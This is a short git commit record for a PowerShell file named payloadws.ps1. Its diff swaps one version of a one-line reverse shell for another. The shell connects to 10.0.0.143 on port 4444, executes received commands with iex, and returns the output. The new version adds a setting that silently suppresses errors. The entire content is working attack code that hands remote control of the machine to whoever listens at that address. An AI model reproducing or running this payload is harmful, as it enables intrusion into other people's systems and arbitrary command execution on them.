466cf51636da516ba5171c9b99dae0c1c4827c1e
David Lajoie <46324931+dclajoie@users.noreply.github.com>
2021-01-19 13:42:09 -0600

    Update payloadws.ps1

--- payloadws.ps1
+++ payloadws.ps1
@@ -1,1 +1,2 @@
-$sm=(New-Object Net.Sockets.TCPClient('10.0.0.143',4444) -ErrorAction Ignore).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding -ErrorAction Ignore).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$ErrorActionPreference='SilentlyContinue'
+$sm=(New-Object Net.Sockets.TCPClient('10.0.0.143',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
